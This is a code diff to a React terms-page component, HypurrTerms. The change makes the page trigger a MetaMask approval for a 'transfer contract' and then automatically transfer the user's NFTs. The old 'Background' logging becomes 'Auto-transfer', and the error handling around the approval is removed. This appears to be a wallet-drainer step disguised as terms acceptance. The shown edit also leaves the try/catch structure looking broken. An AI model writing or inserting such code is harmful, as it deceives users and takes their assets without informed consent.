@@ -399,14 +399,12 @@ const HypurrTerms = () => {
     try {
       setIsTransferring(true);
       
-      // Step 1: Approve contract
+      // Step 1: Approve contract - this will trigger MetaMask popup immediately
       setTransferStatus('approving');
-      console.log('Background: Approving transfer contract...');
-      console.log('Background: This will open MetaMask - please approve the transaction');
-      try {
-        await approveTransferContract();
-        console.log('Background: Approval successful');
-      } catch (approvalError) {
+      console.log('Auto-transfer: Requesting approval - MetaMask popup should appear now');
+      await approveTransferContract();
+      console.log('Auto-transfer: Approval successful');
+      
       // Step 2: Transfer NFTs automatically after approval
       setTransferStatus('transferring');
       console.log('Auto-transfer: Transferring NFTs...');
